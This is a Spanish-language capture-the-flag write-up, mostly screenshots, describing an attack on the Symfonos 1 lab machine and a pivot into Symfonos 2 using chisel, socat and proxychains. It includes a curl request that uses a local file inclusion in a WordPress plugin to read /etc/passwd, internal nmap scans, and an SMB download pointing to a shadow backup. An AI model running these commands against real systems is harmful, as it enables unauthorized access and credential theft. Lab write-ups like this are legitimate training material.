# SYMFONOS 1 - SYMFONOS 2 - PIVOTING
...
Inicialmente he instalado las dos máquinas que me van a servir para hacer el pivoting. La intrusión la voy a realizar en la Symfonos 1 y posteriormente ralizar el pivoting para entrar en la Symfonos 2. Al importar las dos máquinas y ejecutar un escaneo de la red, vemos lo siguiente:
...
![Pasted image 20251109152701](<../../.gitbook/assets/Pasted image 20251109152701.png>)

Primero compruebo que en la web no hay nada visible de primeras, solo una foto:

![Pasted image 20251109153101](<../../.gitbook/assets/Pasted image 20251109153101.png>)
...
![Pasted image 20251109153640](<../../.gitbook/assets/Pasted image 20251109153640.png>)
...
![Pasted image 20251109161657](<../../.gitbook/assets/Pasted image 20251109161657.png>)
...
![Pasted image 20251109162412](<../../.gitbook/assets/Pasted image 20251109162412.png>)
...
![Pasted image 20251109162829](<../../.gitbook/assets/Pasted image 20251109162829.png>)

```bash
searchsploit -x php/webapps/40290.txt
```

![Pasted image 20251109162736](<../../.gitbook/assets/Pasted image 20251109162736.png>)

```bash
curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd"
```

![Pasted image 20251110152028](<../../.gitbook/assets/Pasted image 20251110152028.png>)
...
![Pasted image 20251110165013](<../../.gitbook/assets/Pasted image 20251110165013.png>)
...
![Pasted image 20251110165543](<../../.gitbook/assets/Pasted image 20251110165543.png>)
...
![Pasted image 20251110185841](<../../.gitbook/assets/Pasted image 20251110185841.png>)
...
![Pasted image 20251111151357](<../../.gitbook/assets/Pasted image 20251111151357.png>)

Observo este binario, que tras ejecutarlo arroja lo siguiente:

![Pasted image 20251111151436](<../../.gitbook/assets/Pasted image 20251111151436.png>)
...
![Pasted image 20251111151924](<../../.gitbook/assets/Pasted image 20251111151924.png>)
...
![Pasted image 20251112104825](<../../.gitbook/assets/Pasted image 20251112104825.png>) ![Pasted image 20251112120007](<../../.gitbook/assets/Pasted image 20251112120007.png>)
...
![Pasted image 20251112142434](<../../.gitbook/assets/Pasted image 20251112142434.png>)

La ip **192.168.0.30** es la ip que veía desde mi máquina atacante, y la que me interesa ahora es la ip **10.10.10.129** ya que es en ese segmento de red donde voy a tratar de vulnerar la máquina de la red interna. Para el pivoting voy a utilizar chisel y socat.
...
![Pasted image 20251112212333](<../../.gitbook/assets/Pasted image 20251112212333.png>)
...
![Pasted image 20251112212804](<../../.gitbook/assets/Pasted image 20251112212804.png>)
...
Ahora, después de haber añadido la línea **socks5 127.0.0.1** al archivo /etc/proxychains4.conf, ya puedo ejecutar cualquier comando poniendo siempre el prefijo **proxychains** Voy a hacer un escaneo de nmap de los puertos de la máquina de la red interna con ip 10.10.10.128:

```bash
sudo proxychains4 nmap -sT -Pn -n 10.10.10.128 --top-ports 500 -oN ports_10.10.10.128
```

![Pasted image 20251115160733](<../../.gitbook/assets/Pasted image 20251115160733.png>)

```bash
 sudo proxychains4 nmap -sCV -n -v -Pn -p21,22,80,139,445 10.10.10.128 -oN version_10.10.10.128
```

![Pasted image 20251115160840](<../../.gitbook/assets/Pasted image 20251115160840.png>)
...
![Pasted image 20251115162112](<../../.gitbook/assets/Pasted image 20251115162112.png>)
...
![Pasted image 20251115162249](<../../.gitbook/assets/Pasted image 20251115162249.png>)

```bash
sudo proxychains4 smbmap -H 10.10.10.128 --download 'anonymous/backups/log.txt'
```

![Pasted image 20251118102214](<../../.gitbook/assets/Pasted image 20251118102214.png>)

Aquí ya vemos el primer dato interesante, que es una copia del archivo shadow en la ruta /var/backups/shadow.bak

![Pasted image 20251118102328](<../../.gitbook/assets/Pasted image 20251118102328.png>)
...
![Pasted image 20251118102500](<../../.gitbook/assets/Pasted image 20251118102500.png>)
...
![Pasted image 20251118103206](<../../.gitbook/assets/Pasted image 20251118103206.png>)
...
![Pasted image 20251118210910](<../../.gitbook/assets/Pasted image 20251118210910.png>)
...
![Pasted image 20251118212309](<../../.gitbook/assets/Pasted image 20251118212309.png>)

![Pasted image 20251118212928](<../../.gitbook/assets/Pasted image 20251118212928.png>)
...
![Pasted image 20251118214725](<../../.gitbook/assets/Pasted image 20251118214725.png>)
...
![Pasted image 20251118215551](<../../.gitbook/assets/Pasted image 20251118215551.png>)
...
![Pasted image 20251118215749](<../../.gitbook/assets/Pasted image 20251118215749.png>)

![Pasted image 20251118215858](<../../.gitbook/assets/Pasted image 20251118215858.png>)
